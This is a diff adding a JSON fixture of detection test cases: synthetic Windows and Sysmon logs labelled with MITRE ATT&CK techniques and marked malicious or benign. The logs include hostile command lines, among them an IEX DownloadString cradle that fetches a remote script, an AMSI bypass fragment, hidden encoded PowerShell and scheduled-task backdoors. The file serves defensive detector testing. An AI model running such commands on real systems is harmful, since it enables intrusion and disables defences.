@@ -1,0 +1,114 @@
+[
+  {
+    "name": "full_attack_chain",
+    "description": "Brute-force -> logon -> encoded PowerShell -> C2 -> persistence",
+    "is_malicious": true,
+    "expected_techniques": ["T1110", "T1059.001", "T1071", "T1053.005"],
+    "logs": [
+      {"time": "2026-07-03T14:02:11", "host": "SRV01", "source": "Security", "event_id": 4625, "user": "svc", "ip": "185.220.101.7"},
+      {"time": "2026-07-03T14:02:19", "host": "SRV01", "source": "Security", "event_id": 4625, "user": "svc", "ip": "185.220.101.7"},
+      {"time": "2026-07-03T14:02:44", "host": "SRV01", "source": "Security", "event_id": 4625, "user": "svc", "ip": "185.220.101.7"},
+      {"time": "2026-07-03T14:03:02", "host": "SRV01", "source": "Security", "event_id": 4624, "user": "svc", "ip": "185.220.101.7"},
+      {"time": "2026-07-03T14:03:40", "host": "SRV01", "source": "Sysmon", "event_id": 1, "user": "svc", "image": "powershell.exe", "cmdline": "powershell -w hidden -enc SQBFAFgA", "parent": "cmd.exe"},
+      {"time": "2026-07-03T14:03:55", "host": "SRV01", "source": "Sysmon", "event_id": 3, "user": "svc", "image": "powershell.exe", "dest_ip": "45.9.148.22", "dest_port": 4444},
+      {"time": "2026-07-03T14:04:20", "host": "SRV01", "source": "Sysmon", "event_id": 1, "user": "svc", "image": "schtasks.exe", "cmdline": "schtasks /create /tn Updater /tr c:\\pub\\u.exe /sc onlogon", "parent": "powershell.exe"}
+    ]
+  },
+  {
+    "name": "brute_force_only",
+    "description": "Only brute-force, nothing else",
+    "is_malicious": true,
+    "expected_techniques": ["T1110"],
+    "logs": [
+      {"time": "2026-07-03T09:00:01", "host": "SRV02", "source": "Security", "event_id": 4625, "user": "admin", "ip": "91.240.118.5"},
+      {"time": "2026-07-03T09:00:05", "host": "SRV02", "source": "Security", "event_id": 4625, "user": "admin", "ip": "91.240.118.5"},
+      {"time": "2026-07-03T09:00:09", "host": "SRV02", "source": "Security", "event_id": 4625, "user": "admin", "ip": "91.240.118.5"},
+      {"time": "2026-07-03T09:00:14", "host": "SRV02", "source": "Security", "event_id": 4625, "user": "admin", "ip": "91.240.118.5"}
+    ]
+  },
+  {
+    "name": "c2_beacon",
+    "description": "Encoded PowerShell + external C2 connection, no brute-force",
+    "is_malicious": true,
+    "expected_techniques": ["T1059.001", "T1071"],
+    "logs": [
+      {"time": "2026-07-03T11:10:00", "host": "WKS03", "source": "Sysmon", "event_id": 1, "user": "bob", "image": "powershell.exe", "cmdline": "powershell -nop -encodedcommand ZQBjAGgA", "parent": "winword.exe"},
+      {"time": "2026-07-03T11:10:30", "host": "WKS03", "source": "Sysmon", "event_id": 3, "user": "bob", "image": "powershell.exe", "dest_ip": "193.42.33.10", "dest_port": 8443}
+    ]
+  },
+  {
+    "name": "scheduled_task",
+    "description": "Persistence via scheduled task only",
+    "is_malicious": true,
+    "expected_techniques": ["T1053.005"],
+    "logs": [
+      {"time": "2026-07-03T16:00:00", "host": "WKS04", "source": "Sysmon", "event_id": 1, "user": "carol", "image": "schtasks.exe", "cmdline": "schtasks /create /tn Backdoor /tr c:\\temp\\x.exe /sc daily", "parent": "cmd.exe"}
+    ]
+  },
+  {
+    "name": "download_cradle",
+    "description": "EVASION: no -enc; IEX + DownloadString for in-memory download/execution",
+    "is_malicious": true,
+    "expected_techniques": ["T1059.001", "T1105"],
+    "logs": [
+      {"time": "2026-07-03T12:00:00", "host": "WKS08", "source": "Sysmon", "event_id": 1, "user": "erin", "image": "powershell.exe", "cmdline": "powershell -nop -w hidden IEX (New-Object Net.WebClient).DownloadString('http://185.99.2.4/a.ps1')", "parent": "outlook.exe"}
+    ]
+  },
+  {
+    "name": "amsi_bypass",
+    "description": "EVASION: AMSI bypass to disable defenses",
+    "is_malicious": true,
+    "expected_techniques": ["T1562.001"],
+    "logs": [
+      {"time": "2026-07-03T13:00:00", "host": "WKS09", "source": "Sysmon", "event_id": 1, "user": "frank", "image": "powershell.exe", "cmdline": "powershell -nop -c \"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')\"", "parent": "cmd.exe"}
+    ]
+  },
+  {
+    "name": "noise_resilience",
+    "description": "Attack buried among 6 benign events — should still be found",
+    "is_malicious": true,
+    "expected_techniques": ["T1110", "T1059.001"],
+    "logs": [
+      {"time": "2026-07-03T15:00:00", "host": "SRV10", "source": "Security", "event_id": 4624, "user": "alice", "ip": "10.0.0.5"},
+      {"time": "2026-07-03T15:01:00", "host": "SRV10", "source": "Sysmon", "event_id": 1, "user": "alice", "image": "git.exe", "cmdline": "git pull", "parent": "explorer.exe"},
+      {"time": "2026-07-03T15:02:00", "host": "SRV10", "source": "Sysmon", "event_id": 3, "user": "alice", "image": "chrome.exe", "dest_ip": "142.250.187.4", "dest_port": 443},
+      {"time": "2026-07-03T15:03:01", "host": "SRV10", "source": "Security", "event_id": 4625, "user": "svc", "ip": "77.91.101.2"},
+      {"time": "2026-07-03T15:03:05", "host": "SRV10", "source": "Security", "event_id": 4625, "user": "svc", "ip": "77.91.101.2"},
+      {"time": "2026-07-03T15:03:09", "host": "SRV10", "source": "Security", "event_id": 4625, "user": "svc", "ip": "77.91.101.2"},
+      {"time": "2026-07-03T15:04:00", "host": "SRV10", "source": "Sysmon", "event_id": 1, "user": "bob", "image": "notepad.exe", "cmdline": "notepad report.txt", "parent": "explorer.exe"},
+      {"time": "2026-07-03T15:05:00", "host": "SRV10", "source": "Sysmon", "event_id": 1, "user": "svc", "image": "powershell.exe", "cmdline": "powershell -w hidden -enc SQBmAA==", "parent": "cmd.exe"},
+      {"time": "2026-07-03T15:06:00", "host": "SRV10", "source": "Security", "event_id": 4634, "user": "alice", "ip": "10.0.0.5"}
+    ]
+  },
+  {
+    "name": "below_threshold_logon",
+    "description": "Only 2 failed logons — below threshold, SHOULD NOT alert",
+    "is_malicious": false,
+    "expected_techniques": [],
+    "logs": [
+      {"time": "2026-07-03T08:00:00", "host": "WKS05", "source": "Security", "event_id": 4625, "user": "dave", "ip": "10.0.0.9"},
+      {"time": "2026-07-03T08:03:00", "host": "WKS05", "source": "Security", "event_id": 4625, "user": "dave", "ip": "10.0.0.9"}
+    ]
+  },
+  {
+    "name": "normal_activity",
+    "description": "Completely normal user activity — should be CLEAN",
+    "is_malicious": false,
+    "expected_techniques": [],
+    "logs": [
+      {"time": "2026-07-03T10:00:00", "host": "WKS06", "source": "Security", "event_id": 4624, "user": "alice", "ip": "10.0.0.14"},
+      {"time": "2026-07-03T10:01:00", "host": "WKS06", "source": "Sysmon", "event_id": 1, "user": "alice", "image": "git.exe", "cmdline": "git status", "parent": "explorer.exe"},
+      {"time": "2026-07-03T10:05:00", "host": "WKS06", "source": "Sysmon", "event_id": 3, "user": "alice", "image": "chrome.exe", "dest_ip": "142.250.187.4", "dest_port": 443},
+      {"time": "2026-07-03T10:30:00", "host": "WKS06", "source": "Security", "event_id": 4634, "user": "alice", "ip": "10.0.0.14"}
+    ]
+  },
+  {
+    "name": "wmi_persistence_KNOWN_GAP",
+    "description": "KNOWN GAP: WMI event-subscription persistence — no detector yet (intentional FN)",
+    "is_malicious": true,
+    "expected_techniques": ["T1546"],
+    "logs": [
+      {"time": "2026-07-03T17:00:00", "host": "WKS11", "source": "Sysmon", "event_id": 21, "user": "SYSTEM", "image": "WmiPrvSE.exe", "cmdline": "__EventFilter subscription -> CommandLineEventConsumer c:\\evil\\p.exe", "parent": "svchost.exe"}
+    ]
+  }
+]
